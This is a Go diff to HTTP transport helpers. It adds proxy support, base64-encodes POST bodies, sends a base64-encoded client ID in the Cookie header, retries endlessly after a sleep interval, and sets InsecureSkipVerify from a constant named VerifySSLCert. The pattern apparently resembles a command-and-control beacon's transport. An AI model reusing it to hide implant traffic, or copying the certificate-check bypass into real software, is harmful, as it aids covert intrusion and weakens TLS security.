@@ -2,6 +2,7 @@ package transports
 
 import (
 	"crypto/tls"
+	"encoding/base64"
 	"fmt"
 	"net/http"
 	"time"
@@ -24,16 +25,22 @@ func init() {
 	trans.TLSClientConfig = &tls.Config{InsecureSkipVerify: constants.VerifySSLCert}
 }
 
-func HttpPost(url string, data []byte) *req.Resp {
+func HttpPost(url string, clientID string, data []byte) *req.Resp {
 	for {
-		resp, err := httpRequest.Post(url, data)
+		if constants.UseProxy {
+			httpRequest.SetProxyUrl(constants.Proxy)
+		}
+		httpHeaders := req.Header{
+			"User-Agent": constants.UserAgent,
+			"Cookie":     base64.RawURLEncoding.EncodeToString([]byte(clientID)),
+		}
+		resp, err := httpRequest.Post(url, base64.URLEncoding.EncodeToString([]byte(data)), httpHeaders)
 		if err != nil {
 			fmt.Printf("!error: %v\n", err)
-			time.Sleep(constants.WaitTime)
+			time.Sleep(constants.SleepTime)
 			continue
 		} else {
 			if resp.Response().StatusCode == http.StatusOK {
-				//close socket
 				return resp
 			}
 			break
@@ -42,22 +49,23 @@ func HttpPost(url string, data []byte) *req.Resp {
 
 	return nil
 }
+
 func HttpGet(url string, cookies string) *req.Resp {
 	httpHeaders := req.Header{
 		"User-Agent": constants.UserAgent,
-		"Accept":     "*/*",
 		"Cookie":     cookies,
 	}
 	for {
+		if constants.UseProxy {
+			httpRequest.SetProxyUrl(constants.Proxy)
+		}
 		resp, err := httpRequest.Get(url, httpHeaders)
 		if err != nil {
 			fmt.Printf("!error: %v\n", err)
-			time.Sleep(constants.WaitTime)
+			time.Sleep(constants.SleepTime)
 			continue
-			//panic(err)
 		} else {
 			if resp.Response().StatusCode == http.StatusOK {
-				//close socket
 				return resp
 			}
 			break
